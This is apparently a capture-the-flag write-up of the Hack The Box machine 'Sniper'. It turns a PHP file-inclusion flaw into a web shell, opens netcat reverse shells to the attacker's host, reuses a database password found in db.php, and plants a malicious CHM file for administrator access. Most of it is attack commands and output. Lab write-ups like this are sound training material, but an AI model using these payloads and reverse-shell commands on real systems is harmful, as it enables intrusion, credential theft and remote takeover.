nmap scan

```
sudo nmap -p- --min-rate 10000 -oA nmap 10.10.10.151
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49667/tcp open  unknown
```

### Enumerating port 80

There's this website:

![image1](/assets/images/htb-sniper/sniper1.png)

Going to `/blog` we have this:

![image2](/assets/images/htb-sniper/sniper2.png)

We can change the language:

![image3](/assets/images/htb-sniper/sniper3.png)
 
 I can test for LFI:
 
 ![image4](/assets/images/htb-sniper/sniper4.png)
 
 And it is vulnerable to LFI

### Getting RCE from RFI

First thing I started a http server and try to get a file:

```
GET /blog/?lang=http://10.10.14.13/tmp.php HTTP/1.1
```

But I don't get a request back, after that I'll try with SMB with the `smbserver.py`  from impacket:

```
GET /blog/?lang=//10.10.14.13/tmp.php HTTP/1.1
```

I get a callback but doens't get the file:

```
[*] Incoming connection (10.10.10.151,49689)
[*] Closing down connection (10.10.10.151,49689)
[*] Remaining connections []
```

I'll use Samba, first edit this file with this `/etc/samba/smb.conf`:

```
[share]
   comment = Users profiles
   path = /srv/smb
   guest ok = yes
   browseable = yes
   create mask = 0600
   directory mask = 0700
```

Start the service:

```
sudo systemctl start smbd
```

Now I'll try to get the file:

 ![image5](/assets/images/htb-sniper/sniper5.png)

Now we successfully get the file, the next thing, I'll create a file with:

```
<?php
phpinfo();
?>
```

To check if there are disabled functions:

```
GET /blog/?lang=//10.10.14.13/share/check.php HTTP/1.1
```

 ![image6](/assets/images/htb-sniper/sniper6.png)
 
 There aren't disabled functions so now we have RCE, first I'll create a file to execute commands:
 
 ```
<?php
system($_GET["cmd"]);
?>
```

And we are going to execute `dir`:

 ![image7](/assets/images/htb-sniper/sniper7.png)
 
### Getting a reverse shell

I'll download the binary `nc64.exe`:

```
GET /blog/?lang=//10.10.14.13/share/rce.php&cmd=copy+\\10.10.14.13\share\nc64.exe+c:\programdata\nc.exe
```

And execute it:

```
GET /blog/?lang=//10.10.14.13/share/rce.php&cmd=c:\programdata\nc.exe+-e+cmd.exe+10.10.14.13+9001 
```

And we have a shell:

```
nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.10.151 49699
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot\blog>
```

### Enumerating for privesc vectors

On `C:\inetpub\wwwroot\user\` there's `db.php`:

```
type db.php
type db.php
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>
```

We have a password `36mEAhz/B8xQ~2VM` to see from who is this password I'll see which users are on the machine:

```
C:\inetpub\wwwroot\user>net user
net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Chris                    DefaultAccount           
Guest                    WDAGUtilityAccount       
The command completed with one or more errors.
```

So it will probably be of Chris, first I'll set up the password to be used:

```
$pass = ConvertTo-SecureString "36mEAhz/B8xQ~2VM" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("Sniper\\Chris",$pass)
```

And now I can execute commands:

```
Invoke-Command -ComputerName Sniper -Credential $cred -ScriptBlock {whoami}
sniper\chris
```

### Getting a reverse shell as Chris

I'll execute `nc.exe`:

```
Invoke-Command -ComputerName Sniper -Credential $cred -ScriptBlock {c:\programdata\nc.exe -e cmd.exe 10.10.14.13 9002}
```

And I get the shell back:

```
rlwrap nc -lvnp 9002
Listening on 0.0.0.0 9002
Connection received on 10.10.10.151 49741
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Chris\Documents>
```

### Enumerating as Chris

We have a `\Docs` directory on `C:` with a `.txt` and a `.pdf`

`note.txt`:

```
Hi Chris,
        Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.
```

On `c:\users\chris\downloads` there's a `.chm` file:

```
c:\Users\Chris\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of c:\Users\Chris\Downloads

04/11/2019  07:36 AM    <DIR>          .
04/11/2019  07:36 AM    <DIR>          ..
04/11/2019  07:36 AM            10,462 instructions.chm
               1 File(s)         10,462 bytes
               2 Dir(s)  17,984,270,336 bytes free
```

### Creating a malicious chm file

With a windows machine with the nishang repo I'll use the `out-chm.ps1` (on `nishang/client/`):

```
 . .\Out-CHM.ps1
Out-CHM -Payload "cmd /c C:\programdata\nc.exe -e cmd.exe 10.10.14.13 9003" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```

I'll upload the file to the machine:

```
copy \\10.10.14.13\share\doc.chm .
```

Now I set up a listener and I get a shell as administrator back

```
rlwrap nc -lvnp 9003
Listening on 0.0.0.0 9003
Connection received on 10.10.10.151 49686
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
sniper\administrator
```

